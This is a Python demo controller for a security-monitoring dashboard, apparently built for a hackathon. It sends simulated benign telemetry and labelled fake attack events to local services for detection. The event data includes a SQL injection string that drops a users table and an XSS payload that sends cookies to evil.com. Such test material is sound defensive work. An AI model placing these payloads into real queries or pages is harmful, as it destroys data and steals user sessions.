import requests
import time
import uuid
import random
import json
import threading
import sys
from datetime import datetime

# Configuration
GATEWAY_URL = "http://localhost:3001/internal/telemetry"
INGEST_URL = "http://localhost:8001/ingest"

# ANSI Colors for nicer terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Global control flags
running = True
background_traffic_active = False

def send_payload(data, verbose=False):
    """Sends payload to both Gateway and Ingest services."""
    # Send to Gateway (Visualization)
    try:
        requests.post(GATEWAY_URL, json=data, timeout=1)
    except requests.exceptions.RequestException:
        pass # Ignore connection errors for smooth demo

    # Send to Ingest (Detection)
    try:
        requests.post(INGEST_URL, json=data, timeout=1)
    except requests.exceptions.RequestException:
        pass

def generate_safe_traffic():
    """Generates continuous background safe traffic."""
    while running and background_traffic_active:
        event_id = str(uuid.uuid4())
        
        # Randomize safe metrics
        cpu = random.uniform(10, 45)
        memory = random.uniform(20, 60)
        network = random.uniform(10, 80)
        
        payload = {
            "event_id": event_id,
            "source_ip": f"192.168.1.{random.randint(10, 50)}",
            "domain": "web_server",
            "service": "web-server-01",
            "event_type": "metric",
            "payload": {
                "cpu": cpu,
                "memory": memory,
                "network": network,
                "requests": random.randint(5, 20)
            },
            "timestamp": int(time.time())
        }
        
        send_payload(payload)
        # Optional: Print a dot or small log to show activity without cluttering
        # print(f"{Colors.GREEN}.{Colors.ENDC}", end="", flush=True) 
        time.sleep(1.5)

def launch_attack(attack_type):
    """Launches a specific type of attack."""
    
    attacker_ip = f"10.66.6.{random.randint(10, 99)}"
    
    attack_data = {}
    msg = ""
    
    if attack_type == "sql_injection":
        target = "db-server-01"
        payload_content = {
            "query": "SELECT * FROM users WHERE id = '1' OR '1'='1'; DROP TABLE users --",
            "username": "admin_test"
        }
        attack_data = {
            "event_type": "sql_injection_attempt",
            "payload": payload_content
        }
        msg = "🚀 Launching SQL Injection Attack..."

    elif attack_type == "xss":
        target = "web-frontend"
        payload_content = {
            "query": "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
            "username": "victim_user"
        }
        attack_data = {
            "event_type": "xss_attempt", # Ensure this matches backend expected type
            "payload": payload_content
        }
        msg = "💉 Injecting XSS Payload..."

    elif attack_type == "brute_force":
        target = "auth-service"
        # Simulate a burst of failed logins
        print(f"\n{Colors.WARNING}🔓 Starting Brute Force Simulation (10 attempts)...{Colors.ENDC}")
        for i in range(10):
            event_id = str(uuid.uuid4())
            payload = {
                "event_id": event_id,
                "source_ip": attacker_ip,
                "domain": "web_server",
                "service": target,
                "event_type": "auth_failure",
                "payload": {"username": "admin", "success": False, "password": f"pass{i}"},
                "timestamp": int(time.time())
            }
            send_payload(payload)
            print(f"{Colors.FAIL}[Attempt {i+1}] Login failed for user 'admin' from {attacker_ip}{Colors.ENDC}")
            time.sleep(0.2)
        print(f"{Colors.WARNING}Brute Force Simulation Complete.{Colors.ENDC}\n")
        return # Special handling for loop

    elif attack_type == "ddos":
        target = "web-lb-01"
        print(f"\n{Colors.FAIL}🔥 STARTING DDoS FLOOD (50 packets)...{Colors.ENDC}")
        for i in range(50):
            event_id = str(uuid.uuid4())
            payload = {
                "event_id": event_id,
                "source_ip": f"192.168.99.{random.randint(1, 255)}", # Botnet IPs
                "domain": "web_server",
                "service": target,
                "event_type": "metric_flood",
                "payload": {"cpu": 99, "memory": 90, "network": 8000 + i*100, "syn_count": 500},
                "timestamp": int(time.time())
            }
            send_payload(payload)
            if i % 10 == 0:
                print(f"{Colors.FAIL}   >>> Flooding... Packet batch {i}{Colors.ENDC}")
            time.sleep(0.05) # Very fast
        print(f"{Colors.FAIL}DDoS Flood Complete.{Colors.ENDC}\n")
        return

    else:
        print("Unknown attack type")
        return

    # For single request attacks (SQLi, XSS)
    event_id = str(uuid.uuid4())
    full_payload = {
        "event_id": event_id,
        "source_ip": attacker_ip,
        "domain": "web_server",
        "service": "web-server-01",
        "event_type": attack_data['event_type'],
        "payload": attack_data['payload'],
        "timestamp": int(time.time())
    }
    
    print(f"\n{Colors.FAIL}{msg}{Colors.ENDC}")
    print(f"{Colors.FAIL}Source: {attacker_ip} | Target: {full_payload['service']}{Colors.ENDC}")
    send_payload(full_payload)
    print(f"{Colors.GREEN}Payload Sent! Check Dashboard.{Colors.ENDC}\n")


def print_menu():
    print(f"\n{Colors.CYAN}{Colors.BOLD}=== SERVER GUARD LIVE DEMO CONTROLLER ==={Colors.ENDC}")
    print(f"{Colors.CYAN}1.{Colors.ENDC} toggle Safe Background Traffic  [{'ON' if background_traffic_active else 'OFF'}]")
    print(f"{Colors.CYAN}2.{Colors.ENDC} {Colors.FAIL}Launch SQL Injection Attack{Colors.ENDC}")
    print(f"{Colors.CYAN}3.{Colors.ENDC} {Colors.FAIL}Launch XSS Attack{Colors.ENDC}")
    print(f"{Colors.CYAN}4.{Colors.ENDC} {Colors.WARNING}Simulate Brute Force Attack{Colors.ENDC}")
    print(f"{Colors.CYAN}5.{Colors.ENDC} {Colors.FAIL}Simulate DDoS Flood{Colors.ENDC}")
    print(f"{Colors.CYAN}6.{Colors.ENDC} Exit")
    print(f"{Colors.CYAN}======================================={Colors.ENDC}")

def main():
    global background_traffic_active, running
    
    # Start background thread for safe traffic (initially paused or active based on flag)
    bg_thread = threading.Thread(target=generate_safe_traffic)
    bg_thread.daemon = True
    bg_thread.start()

    print(f"{Colors.BOLD}Welcome to Server Guard Demo.{Colors.ENDC}")
    
    while True:
        print_menu()
        choice = input(f"{Colors.YELLOW}Select an option (1-6): {Colors.ENDC}").strip()
        
        if choice == '1':
            background_traffic_active = not background_traffic_active
            status = "STARTED" if background_traffic_active else "STOPPED"
            color = Colors.GREEN if background_traffic_active else Colors.WARNING
            print(f"\n{color}Background Safe Traffic {status}{Colors.ENDC}")
            if background_traffic_active:
                # Kickstart the loop if it was stuck
                pass 
                
        elif choice == '2':
            launch_attack("sql_injection")
        elif choice == '3':
            launch_attack("xss")
        elif choice == '4':
            launch_attack("brute_force")
        elif choice == '5':
            launch_attack("ddos")
        elif choice == '6':
            print(f"\n{Colors.BLUE}Good luck with the judges! Exiting...{Colors.ENDC}")
            running = False
            break
        else:
            print("Invalid option. Try again.")
            
        time.sleep(0.5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        running = False
